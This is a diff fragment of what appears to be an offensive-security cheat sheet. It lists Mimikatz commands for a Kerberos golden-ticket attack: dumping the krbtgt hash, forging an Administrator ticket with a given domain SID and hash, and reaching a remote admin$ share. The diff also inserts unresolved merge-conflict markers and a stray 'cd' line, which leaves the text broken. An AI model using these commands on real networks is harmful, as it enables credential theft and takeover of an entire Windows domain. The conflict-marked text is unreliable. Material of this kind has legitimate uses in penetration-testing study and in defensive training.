@@ -2581,7 +2581,11 @@ dir \\<RHOST>\admin$
 .\mimikatz.exe
 privilege::debug
 lsadump::lsa /inject /name:krbtgt
+<<<<<<< HEAD
 kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
+=======
+cd 
+>>>>>>> 3c482fe (removed commits)
 misc::cmd
 klist
 dir \\<RHOST>\admin$
